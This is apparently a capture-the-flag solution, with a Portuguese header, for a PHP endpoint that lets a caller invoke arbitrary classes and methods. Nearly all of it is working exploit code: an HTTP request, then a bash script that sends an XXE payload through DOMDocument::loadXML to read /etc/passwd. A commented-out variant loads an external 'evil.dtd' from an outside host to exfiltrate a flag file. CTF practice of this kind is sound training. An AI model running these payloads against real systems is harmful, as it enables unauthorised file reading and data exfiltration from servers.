# Durante um pentest, Kadu da Crowsec achou um endpoint esquisito que mostra um código PHP.
# Será que você conseguirá explorar?

POST / HTTP/2
Host: unhide.app
Authorization: Bearer {token}
Accept: application/json"
Content-Type: application/json
Content-Length: 81

{
    "classe": "Exception",
    "funcao": "__toString",
    "arg": ["aaa"]
}

#!/bin/bash

# Payload malicioso
malicious_xml='<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>'

# malicious_xml='<?xml version="1.0" encoding="ISO-8859-1"?>
# <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
# <!DOCTYPE data [
#   <!ENTITY % file SYSTEM
#   "file:///etc/passwd">
#   <!ENTITY % dtd SYSTEM
#   "https://claudioctf.000webhostapp.com/evil.dtd">
#   %dtd;
# ]>
# <data>&send;</data>'

# Escape as aspas internas no payload XML
escaped_xml=$(echo "$malicious_xml" | sed 's/"/\\"/g')

# Formate o payload completo como uma string JSON
payload='{
  "classe": "DOMDocument",
  "funcao": "loadXML",
  "arg": ["'$escaped_xml'"]
}'

# Envia o payload para o endpoint usando curl
curl -X POST -H "Content-Type: application/json" \
-d "$payload" http://localhost:8080/